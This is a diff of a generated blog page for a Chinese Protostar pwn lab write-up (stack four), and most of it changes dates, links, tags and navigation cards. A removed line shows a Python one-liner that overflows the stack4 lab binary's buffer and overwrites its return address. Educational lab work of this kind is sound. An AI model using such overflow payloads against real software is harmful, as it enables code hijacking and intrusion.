-<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"print('A'*(4*19)+'\xf4\x83\x04\x08')"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>stack4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731314460207.png" alt="1731314460207"></p>
-<p>成功破解</p>
+<p><img src="/img/1731288271210.png"></p>
+<p> 然后继续运行程序 </p>
+<p><img src="/img/1731288308240.png"></p>
+<p>破解成功！</p>
 
                 
             </div>
@@ -579,7 +607,7 @@ pop ebp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Pr0b1em.github.io/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA3%20stack%20three%EF%BC%8Cstack%20four/">https://Pr0b1em.github.io/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA3%20stack%20three%EF%BC%8Cstack%20four/</a>
+                    <a href="https://Pr0b1em.github.io/2024/11/11/Pwn-protostar%E9%9D%B6%E5%9C%BA1%20%20stack_zero/">https://Pr0b1em.github.io/2024/11/11/Pwn-protostar%E9%9D%B6%E5%9C%BA1%20%20stack_zero/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -616,7 +644,11 @@ pop ebp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/pwn/">
+                                    <span class="chip bg-color">pwn</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -697,13 +729,13 @@ pop ebp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA4%20stack%20five,stack%20six,stack%20seven/">
+                <a href="/2024/11/12/Pwn-protostar%E9%9D%B6%E5%9C%BA2%20stack%20one%EF%BC%8Cstack%20two/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Pwn-protostar靶场2 stack one，stack two">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">Pwn-protostar靶场2 stack one，stack two</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -714,15 +746,27 @@ pop ebp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-03
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-11-12
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Pr0b1em
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    学习
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -734,13 +778,13 @@ pop ebp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA2%20stack%20one%EF%BC%8Cstack%20two/">
+                <a href="/2023/05/30/UUCTF%20writeup/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="UUCTF writeup">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">UUCTF writeup</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -751,15 +795,27 @@ pop ebp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-30
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Pr0b1em
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/writeup/" class="post-category">
+                                    writeup
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
                 </div>
                 
             </div>
